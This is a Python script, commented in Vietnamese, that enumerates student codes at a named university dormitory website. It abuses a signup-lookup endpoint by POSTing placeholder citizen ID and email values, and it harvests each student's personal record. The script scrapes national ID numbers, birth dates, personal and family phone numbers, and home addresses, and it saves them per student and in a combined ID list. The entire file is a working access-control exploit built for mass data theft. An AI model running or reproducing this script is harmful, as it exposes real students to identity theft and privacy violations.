import requests
from bs4 import BeautifulSoup
import json
import os
from time import sleep
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

# Nhập khóa lớp và kiểm tra
khoa_lop = input("Nhập khóa và lớp (e.g., 23NS): ")
normalized = re.sub(r'\s+|\.', '', khoa_lop.strip().upper())
match = re.match(r'^(\d{2})([A-Z]+)$', normalized)
if not match:
    print("❌ Sai định dạng lớp. Vui lòng nhập đúng (ví dụ: 23NS, 23 IT.B, ...)")
    exit(1)
khoa, lop = match.groups()

# Tạo thư mục lưu trữ
base_dir = os.path.join("data", khoa, lop)
os.makedirs(base_dir, exist_ok=True)
all_info_path = os.path.join(base_dir, "all_info.txt")

# URL gửi POST
post_url = 'https://kytucxa.vku.udn.vn/home/register/find-student-signup'

# Biến toàn cục và lock để đảm bảo an toàn luồng
lock = threading.Lock()
all_info_initialized = False
consecutive_failures = 0
max_consecutive_failures = 5
max_retries = 3

def process_student(kq):
    global all_info_initialized, consecutive_failures
    print(f"\nProcessing student code: {kq}")
    retry_count = 0
    student_info = None

    while retry_count < max_retries:
        try:
            r = requests.get(f'https://kytucxa.vku.udn.vn/home/info/find-student?code={kq}', timeout=10)
            r.raise_for_status()
            soup = BeautifulSoup(r.text, 'html.parser')
            raw_data = soup.p.text

            student_info = {}
            for line in raw_data.strip().split('\n'):
                key, value = line.split(": ", 1)
                student_info[key.strip()] = value.strip()

            json_data = json.loads(json.dumps(student_info, ensure_ascii=False))
            cleaned_fullname = re.sub(r'\s+', ' ', json_data['Họ và tên']).strip()
            break
        except Exception as e:
            retry_count += 1
            print(f"GET Error for {kq} (Attempt {retry_count}/{max_retries}): {e}")
            sleep(1)
    if not student_info:
        with lock:
            consecutive_failures += 1
            if consecutive_failures >= max_consecutive_failures:
                print(f"❌ Stopping script after {max_consecutive_failures} consecutive failures")
                os._exit(1)
        return

    # Reset failure nếu thành công
    with lock:
        consecutive_failures = 0

    # Gửi POST
    data = {
        'code': json_data['Mã sinh viên'],
        'fullname': cleaned_fullname,
        'citizen_id': '111111111111111',
        'email': 'a@a.c'
    }

    retry_count = 0
    while retry_count < max_retries:
        try:
            response = requests.post(post_url, data=data, timeout=10)
            response.raise_for_status()
            soup = BeautifulSoup(response.text, 'html.parser')

            def safe_get(id):
                el = soup.find('input', {'id': id})
                return el['value'] if el else ''

            raw_data = {
                'student_id': safe_get('student_id'),
                'MaSinhVien': safe_get('MaSinhVien'),
                'HoDem': safe_get('HoDem'),
                'Ten': safe_get('Ten'),
                'NgaySinh': safe_get('NgaySinh'),
                'Lop': safe_get('Lop'),
                'KhoaHoc': safe_get('KhoaHoc'),
                'Khoa': safe_get('Khoa'),
                'Nganh': safe_get('Nganh'),
                'Truong': safe_get('Truong'),
                'SoCMND': safe_get('SoCMND'),
                'NgayCap': safe_get('NgayCap'),
                'NoiCap': safe_get('NoiCap'),
                'SDTCaNhan': safe_get('SDTCaNhan'),
                'SDTGiaDinh': safe_get('SDTGiaDinh'),
                'Email': safe_get('Email'),
                'HoKhau': safe_get('HoKhau'),
                'DiaChi': safe_get('DiaChi'),
                'TinhThanhPho': safe_get('TinhThanhPho'),
            }

            gioi_tinh_input = soup.find('input', {'name': 'GioiTinh', 'checked': 'checked'})
            raw_data['GioiTinh'] = 'Nữ' if gioi_tinh_input and gioi_tinh_input['value'] == '0' else 'Nam'

            if raw_data['SoCMND']:
                with lock:
                    if not all_info_initialized:
                        with open(all_info_path, 'a', encoding='utf-8') as f:
                            f.write(f"Danh sách Mã sinh viên và Số CMND ({khoa_lop}):\n")
                            f.write("'-----------------------------------'\n")
                        all_info_initialized = True

                    with open(all_info_path, 'a', encoding='utf-8') as f:
                        f.write(f"Mã sinh viên: {raw_data['MaSinhVien']}: Số CMND: {raw_data['SoCMND']}: Họ và tên: {cleaned_fullname}\n")
                    print(f"Appended to {all_info_path}: Mã sinh viên: {raw_data['MaSinhVien']}")

            student_dir = os.path.join(base_dir, cleaned_fullname)
            os.makedirs(student_dir, exist_ok=True)

            with open(os.path.join(student_dir, "info.txt"), 'w', encoding='utf-8') as f:
                for k, v in raw_data.items():
                    f.write(f"{k}: {v}\n")
                f.write("'-----------------------------------'\n")

            with open(os.path.join(student_dir, "response.html"), 'w', encoding='utf-8') as f:
                f.write(response.text)

            print(f"✅ Done: {cleaned_fullname}")
            break
        except Exception as e:
            retry_count += 1
            print(f"POST Error for {kq} (Attempt {retry_count}/{max_retries}): {e}")
            sleep(1)
    else:
        with lock:
            consecutive_failures += 1
            if consecutive_failures >= max_consecutive_failures:
                print(f"❌ Stopping script after {max_consecutive_failures} consecutive failures")
                os._exit(1)

# ---------- Chạy đa luồng ----------
with ThreadPoolExecutor(max_workers=10) as executor:
    futures = [executor.submit(process_student, f"{khoa_lop}{i:03}") for i in range(1, 999)]
    for future in as_completed(futures):
        pass

# Kiểm tra kết quả
if os.path.exists(all_info_path):
    with open(all_info_path, 'r', encoding='utf-8') as f:
        lines = f.readlines()
        entry_count = len([line for line in lines if line.strip() and not line.startswith(('Danh sách', "'----"))])
    print(f"✅ Completed: {all_info_path} contains {entry_count} entries")
else:
    print(f"✅ Completed: No entries written to {all_info_path}")

print("🎉 Processing completed.")
